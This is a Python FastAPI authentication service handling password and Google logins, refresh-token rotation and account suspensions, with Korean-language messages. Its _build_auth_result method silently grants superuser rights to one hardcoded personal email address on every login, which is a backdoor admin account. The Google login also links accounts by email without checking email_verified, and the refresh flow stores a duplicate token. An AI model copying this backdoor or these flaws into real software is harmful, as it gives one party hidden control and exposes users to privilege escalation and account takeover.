import secrets
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone

from google.auth.transport import requests
from google.oauth2 import id_token
from starlette.concurrency import run_in_threadpool

from app.core import security
from app.core.config import get_settings
from app.models.team import Team
from app.models.user import User
from app.repositories.refresh_token_repository import RefreshTokenRepository
from app.repositories.team_repository import TeamRepository
from app.repositories.user_repository import UserRepository


@dataclass
class AuthResult:
    access_token: str
    refresh_token: str
    token_type: str
    user: User
    current_team: Team
    teams: list[Team]


class AuthService:
    def __init__(
        self,
        user_repo: UserRepository,
        team_repo: TeamRepository,
        refresh_token_repo: RefreshTokenRepository,
    ):
        self.user_repo = user_repo
        self.team_repo = team_repo
        self.refresh_token_repo = refresh_token_repo

    async def login_with_password(self, email: str, password: str) -> AuthResult | None:
        user = await self.user_repo.get_by_email(email)
        if not user or not security.verify_password(password, user.hashed_password):
            return None

        # Handle inactivity recovery and update last login
        await self._handle_user_login_metadata(user)

        if user.status in ("suspended", "banned") or not user.is_active:
            await self._raise_suspension_error(user)

        return await self._build_auth_result(user)

    async def login_with_google(self, google_client_id: str, token: str) -> AuthResult | None:
        # Wrap blocking Google library call in a threadpool
        idinfo = await run_in_threadpool(
            id_token.verify_oauth2_token,
            token,
            requests.Request(),
            google_client_id
        )
        email = idinfo.get("email")
        if not email:
            return None
        user = await self.user_repo.get_by_email(email)
        if not user:
            user = await self.user_repo.create_google_user(
                email=email,
                full_name=idinfo.get("name") or email.split("@")[0],
                hashed_password=security.get_password_hash(secrets.token_hex(32)),
            )

        # Handle inactivity recovery and update last login
        await self._handle_user_login_metadata(user)

        if user.status in ("suspended", "banned") or not user.is_active:
            await self._raise_suspension_error(user)

        return await self._build_auth_result(user)

    async def refresh_access_token(self, raw_refresh_token: str) -> AuthResult | None:
        token_hash = security.hash_refresh_token(raw_refresh_token)
        stored = await self.refresh_token_repo.get_by_hash(token_hash)
        if not stored:
            return None

        if self.refresh_token_repo.is_expired(stored):
            await self.refresh_token_repo.revoke(stored.id)
            return None

        # Token rotation: revoke old, issue new
        user = await self.user_repo.get_by_id(stored.user_id)
        if not user or not user.is_active:
            await self.refresh_token_repo.revoke_all_for_user(stored.user_id)
            return None

        result = await self._build_auth_result(user)

        # Mark old token as replaced by the new one
        settings = get_settings()
        new_token_hash = security.hash_refresh_token(result.refresh_token)
        new_stored = await self.refresh_token_repo.create(
            user_id=user.id,
            token_hash=new_token_hash,
            expires_at=datetime.utcnow()
            + timedelta(days=settings.REFRESH_TOKEN_EXPIRE_DAYS),
        )
        await self.refresh_token_repo.mark_replaced(stored.id, new_stored.id)

        return result

    async def detect_refresh_token_reuse(self, raw_refresh_token: str) -> bool:
        """Check if a revoked token is being reused (possible theft)."""
        token_hash = security.hash_refresh_token(raw_refresh_token)
        stored = await self.refresh_token_repo.get_by_hash(token_hash)
        # If get_by_hash returns None (revoked=True excluded), check if it was revoked
        if stored is None:
            from sqlmodel import select
            from app.models.refresh_token import RefreshToken

            result = await self.refresh_token_repo.session.execute(
                select(RefreshToken).where(RefreshToken.token_hash == token_hash)
            )
            revoked_token = result.scalar_one_or_none()
            if revoked_token and revoked_token.revoked:
                # Reuse detected — revoke all tokens for this user
                await self.refresh_token_repo.revoke_all_for_user(revoked_token.user_id)
                return True
        return False

    async def _handle_user_login_metadata(self, user: User) -> None:
        """Update last_login_at and recover suspended users if applicable."""
        now = datetime.utcnow()
        user.last_login_at = now

        # Check for suspension recovery: if suspended_until has expired, restore
        if user.status.startswith("suspended") and user.suspended_until:
            if user.suspended_until <= now:
                user.status = "active"
                user.is_active = True
                user.suspended_until = None

        # suspended_inactive users are restored on login
        if user.status == "suspended_inactive":
            user.status = "active"
            user.is_active = True

        self.user_repo.session.add(user)
        await self.user_repo.session.commit()
        await self.user_repo.session.refresh(user)

    async def _raise_suspension_error(self, user: User) -> None:
        """정지/차단된 유저에 대해 403 에러 발생 및 사유 전달"""
        from fastapi import HTTPException
        reason = user.audit_log_reason
        try:
            latest_reason = await self.user_repo.get_latest_discipline_reason(user.id)
            if latest_reason:
                reason = latest_reason
        except Exception as e:
            import logging
            logging.getLogger(__name__).warning(f"Failed to fetch latest discipline reason for user {user.id}: {e}")

        if not reason:
            reason = "운영 정책 위반으로 인해 계정이 제한되었습니다."
            
        expiry = ""
        expiry_iso = None
        detail_msg = f"계정이 영구 정지되었습니다. (사유: {reason})"
        if user.suspended_until:
            kst_time = user.suspended_until.replace(tzinfo=timezone.utc).astimezone(timezone(timedelta(hours=9)))
            expiry = kst_time.strftime("%Y년 %m월 %d일 %H시 %M분")
            expiry_iso = user.suspended_until.replace(tzinfo=timezone.utc).isoformat()
            detail_msg = f"계정이 정지되었습니다. (사유: {reason}, 정지 해제 일시: {expiry})"
            
        raise HTTPException(
            status_code=403,
            detail={
                "message": detail_msg,
                "reason": reason,
                "expiry": expiry,
                "expiry_iso": expiry_iso
            }
        )

    async def _build_auth_result(self, user: User) -> AuthResult:
        # 특정 이메일은 로그인 시 관리자 권한 강제 부여
        if user.email == "dojyu1928@gmail.com" and not user.is_superuser:
            user.is_superuser = True
            self.user_repo.session.add(user)
            await self.user_repo.session.commit()
            await self.user_repo.session.refresh(user)

        teams = await self.team_repo.list_for_user(user.id)
        if not teams:
            default_team = await self.team_repo.create_default_team_for_user(user.id, user.email)
            teams = [default_team]
        current_team = teams[0]

        access_token = security.create_access_token(subject=str(user.id))
        raw_refresh_token = security.create_refresh_token()

        # Store refresh token in DB
        settings = get_settings()
        token_hash = security.hash_refresh_token(raw_refresh_token)
        await self.refresh_token_repo.create(
            user_id=user.id,
            token_hash=token_hash,
            expires_at=datetime.utcnow()
            + timedelta(days=settings.REFRESH_TOKEN_EXPIRE_DAYS),
        )

        return AuthResult(
            access_token=access_token,
            refresh_token=raw_refresh_token,
            token_type="bearer",
            user=user,
            current_team=current_team,
            teams=teams,
        )
